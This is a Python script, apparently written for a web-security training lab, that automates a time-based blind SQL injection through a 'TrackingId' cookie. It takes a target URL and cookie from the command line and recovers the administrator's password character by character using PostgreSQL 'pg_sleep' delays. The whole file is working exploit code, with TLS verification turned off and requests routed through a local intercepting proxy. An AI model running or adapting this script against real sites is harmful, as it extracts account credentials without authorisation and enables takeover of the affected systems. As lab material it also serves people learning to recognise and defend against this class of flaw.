
import sys
import requests
import urllib3
import urllib.parse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}




def sqli_password(url,tracking_cookie):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = f"' || (select case when (username='administrator' and ascii(substring(password,{i},1))='{j}') then pg_sleep(6) else pg_sleep(-1) end from users)--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': tracking_cookie + sqli_payload_encoded}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) >= 6:
                password_extracted += chr(j)
                sys.stdout.write('\r'+password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password_extracted+ chr(j))
                sys.stdout.flush()


if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
        tracking_cookie = sys.argv[2].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url> <tracking_cookie>")
        print(f'[*] Example: {sys.argv[0]} "www.example.com" "Ycbewfn3x&n23f"')
        sys.exit(-1)

    print("Determining the password of administrator...")
    sqli_password(url,tracking_cookie)